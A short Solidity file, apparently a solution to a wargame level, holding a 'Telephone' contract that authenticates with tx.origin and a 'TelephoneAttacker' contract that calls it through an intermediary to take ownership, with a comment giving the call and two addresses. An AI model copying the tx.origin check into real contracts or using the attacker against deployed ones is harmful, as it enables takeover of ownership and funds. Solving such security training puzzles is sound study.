pragma solidity ^0.4.18;

contract Telephone {
  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttacker{
  function attack(address _target, address _new_owner){
    Telephone t = Telephone(_target);
    t.changeOwner(_new_owner);
  }
}

// Call TelephoneAttacker.attack("0x2cd7f4e461b4fa3d9fc13ac23327c3c1cf929893", "0xe2beee380cdd2613c8d69177c3afe2142d9c33ec")